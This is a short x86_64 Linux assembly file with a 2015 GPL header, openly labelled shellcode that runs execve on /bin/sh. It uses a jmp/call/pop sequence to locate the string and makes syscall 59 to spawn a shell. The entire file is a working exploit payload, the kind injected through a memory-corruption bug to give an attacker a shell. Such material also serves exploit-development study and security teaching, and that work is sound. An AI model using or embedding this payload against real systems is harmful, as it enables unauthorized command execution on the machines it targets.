    #
    # Execve /bin/sh Shellcode Via Pop (Linux x86_64)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #


    .global _start
_start:
    jmp just_before_str

execve_sh:
    popq %rdi

    pushq $59
    popq %rax

    xorl %esi, %esi

    syscall

just_before_str:
    call execve_sh
    .asciz "/bin/sh"
